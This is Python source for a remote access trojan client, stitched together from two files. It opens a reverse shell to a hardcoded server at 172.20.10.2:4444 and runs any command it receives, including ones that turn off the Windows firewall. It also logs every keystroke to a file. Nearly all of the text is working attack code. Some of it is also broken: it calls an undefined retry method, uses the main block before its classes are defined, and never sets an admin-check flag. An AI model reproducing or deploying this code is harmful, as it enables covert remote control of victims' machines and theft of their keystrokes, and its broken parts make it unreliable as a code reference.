import time
import socket
import logging
from pynput.keyboard import Key, Listener


class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Logs key events to a file
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int, filename: str = "activity.log") -> None:
        """
        Constructor

        :param host: The server's IP
        :param port: The server's port number
        :param filename: The file's name where the keystrokes are stored
        """
        self.host = host
        self.port = port
        self.filename = filename

        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)

    def run(self) -> None:
        """
        Creates a connection between server and client.
        Starts logging key events
        Gets a reverse shell from client to server
        """

        # --------------------------REV SHELL--------------------------#

        # Get a reverse shell back to server
        try:
            self.shell.get_shell()
        except socket.error:
            time.sleep(5)  # Wait 5s
            self.sock.close()  # Close erroneous connection
            self.hack()  # Retry

        # --------------------------KEYLOGGER--------------------------#

        log_dir = ""

        logging.basicConfig(filename=(log_dir + self.filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()

        # --------------------------------------------------------------#

        # Close connection when finished
        self.sock.close()


if __name__ == "__main__":
    # Run RAT with specified IP and port
    Client("172.20.10.2", 4444).run()


class Connection:
    """
    Opens a socket connection between server and client
    """

    def __init__(self, host: str, port: int) -> None:
        """
        Constructor

        :param host: IP of server
        :param port: Port of server
        """

        self.host = host
        self.port = port

        # Selects family IPv4 to connect to with TCP
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self) -> socket:
        """
        Creates socket connection between client and server
        """

        # Creates tuple with address and port
        server_address = (self.host, self.port)

        while 1:  # Try until it connects
            try:
                # Connect to host
                self.sock.connect(server_address)
                break
            except socket.error:
                # Wait 5 seconds and retry
                time.sleep(5)

        # Connection successful
        self.sock.send(str.encode("Successfully connected\n"))

        return self.sock
import os
import socket
import subprocess
import ctypes


class Shell:
    """
    Gets a simple reverse shell back to host
    """

    def __init__(self, sock: socket) -> None:
        """
        Constructor

        :param sock: The socket to send the data through
        """
        self.sock = sock

    def get_shell(self) -> None:
        """
        Executes received commands from the server and sends the output back through the socket
        """

        while 1:  # Infinite loop
            try:
                # Gets cwd and sends to server
                self.sock.send(str.encode(os.getcwd() + "# "))

                # Receives messages from server
                data = self.sock.recv(1024).decode("UTF-8")
                data = data.strip('\n')

                # Special cases

                # Exits shell
                if data == "quit" or data == "exit":
                    break

                # Changes directory
                if data[:2] == "cd":
                    os.chdir(data[3:])

                # Lists cwd with ls
                if data == "ls":
                    data = "dir"

                # Disables/enables firewall
                if data == "firewall off":
                    data = "netsh advfirewall set currentprofile state off"
                if data == "firewall on":
                    data = "netsh advfirewall set currentprofile state on"

                # Locks the screen of client
                if data == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    data = "echo Screen locked"
                    
                # Checks if client has admin rights
                if data == "check admin":
                    check_admin_flag = True
                    data = "echo %ERRORLEVEL%"

                if len(data) > 0:
                    # Executes arbitrary command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    
                    # To check if user has admin privileges
                    if check_admin_flag:
                        if output_str == "0":
                            output_str = "You ARE an administrator"
                        else:
                            output_str = "You are NOT an administrator"
                        
                        # Reset flag
                        check_admin_flag = False

                    # Sends output back to server
                    self.sock.send(str.encode("\n" + output_str))

            except socket.error:
                continue
